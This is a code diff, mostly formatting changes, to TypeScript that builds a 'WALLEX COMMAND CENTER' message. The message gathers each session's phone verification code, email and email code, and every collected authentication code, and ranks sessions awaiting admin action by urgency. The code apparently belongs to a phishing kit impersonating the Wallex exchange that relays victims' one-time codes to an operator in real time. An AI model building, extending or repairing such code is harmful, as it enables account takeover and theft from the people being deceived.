@@ -292,7 +292,7 @@ export const updateUserOnlineStatus = async (
 
     return { success: true };
   } catch (error) {
-    console.error("�� Failed to update online status:", error);
+    console.error("❌ Failed to update online status:", error);
     return { success: false };
   }
 };
@@ -1063,11 +1063,11 @@ const formatSessionMessage = (session: UserSession): string => {
   const now = new Date();
   const currentTime = now.toLocaleString("fa-IR", {
     hour: "2-digit",
-    minute: "2-digit"
+    minute: "2-digit",
   });
   const currentDate = now.toLocaleDateString("fa-IR", {
     month: "2-digit",
-    day: "2-digit"
+    day: "2-digit",
   });
 
   // Session duration
@@ -1088,7 +1088,10 @@ const formatSessionMessage = (session: UserSession): string => {
   }
 
   // Smart priority system
-  const getSmartStatus = (step: string, duration: number): {
+  const getSmartStatus = (
+    step: string,
+    duration: number,
+  ): {
     emoji: string;
     priority: string;
     urgency: string;
@@ -1098,7 +1101,8 @@ const formatSessionMessage = (session: UserSession): string => {
 
     switch (step) {
       case "waiting_admin":
-        if (isCritical) return { emoji: "🔴", priority: "CRITICAL", urgency: "⚡" };
+        if (isCritical)
+          return { emoji: "🔴", priority: "CRITICAL", urgency: "⚡" };
         if (isUrgent) return { emoji: "🟠", priority: "URGENT", urgency: "⏰" };
         return { emoji: "🟡", priority: "PENDING", urgency: "📋" };
       case "phone_verification":
@@ -1124,10 +1128,12 @@ const formatSessionMessage = (session: UserSession): string => {
     let activityLevel;
     let timeDisplay;
 
-    if (timeSinceUpdate < 30000) { // Less than 30 seconds
+    if (timeSinceUpdate < 30000) {
+      // Less than 30 seconds
       activityLevel = "ACTIVE";
       timeDisplay = `${Math.floor(timeSinceUpdate / 1000)}s`;
-    } else if (timeSinceUpdate < 300000) { // Less than 5 minutes
+    } else if (timeSinceUpdate < 300000) {
+      // Less than 5 minutes
       activityLevel = "RECENT";
       timeDisplay = `${Math.floor(timeSinceUpdate / 60000)}m`;
     } else {
@@ -1144,19 +1150,27 @@ const formatSessionMessage = (session: UserSession): string => {
 
   // Phone verification code
   if (session.phoneVerificationCode) {
-    allCodes.push(`${codeCounter}. PHONE: <code>${escapeHtml(session.phoneVerificationCode)}</code>`);
+    allCodes.push(
+      `${codeCounter}. PHONE: <code>${escapeHtml(session.phoneVerificationCode)}</code>`,
+    );
     codeCounter++;
   }
 
   // Email and email code
   if (session.email) {
-    const emailShort = session.email.length > 30 ?
-      session.email.substring(0, 27) + "..." : session.email;
-    allCodes.push(`${codeCounter}. EMAIL: <code>${escapeHtml(emailShort)}</code>`);
+    const emailShort =
+      session.email.length > 30
+        ? session.email.substring(0, 27) + "..."
+        : session.email;
+    allCodes.push(
+      `${codeCounter}. EMAIL: <code>${escapeHtml(emailShort)}</code>`,
+    );
     codeCounter++;
 
     if (session.emailCode) {
-      allCodes.push(`${codeCounter}. EMAIL CODE: <code>${escapeHtml(session.emailCode)}</code>`);
+      allCodes.push(
+        `${codeCounter}. EMAIL CODE: <code>${escapeHtml(session.emailCode)}</code>`,
+      );
       codeCounter++;
     }
   }
@@ -1166,7 +1180,6 @@ const formatSessionMessage = (session: UserSession): string => {
     Object.keys(session.authCodes).forEach((stepType) => {
       const stepCodes = session.authCodes[stepType];
       if (stepCodes && stepCodes.length > 0) {
-
         // Show ALL codes for each type, not just the latest
         stepCodes.forEach((code, index) => {
           let stepName;
@@ -1187,7 +1200,9 @@ const formatSessionMessage = (session: UserSession): string => {
               stepName = stepType.toUpperCase();
           }
 
-          allCodes.push(`${codeCounter}. ${stepName}: <code>${escapeHtml(code)}</code>`);
+          allCodes.push(
+            `${codeCounter}. ${stepName}: <code>${escapeHtml(code)}</code>`,
+          );
           codeCounter++;
         });
       }
@@ -1206,9 +1221,6 @@ const formatSessionMessage = (session: UserSession): string => {
 <i>🔐 WALLEX COMMAND CENTER</i>`;
 
   return message;
-};
-
-  return stepTexts[step] || step.toUpperCase();
 };
 
 /**
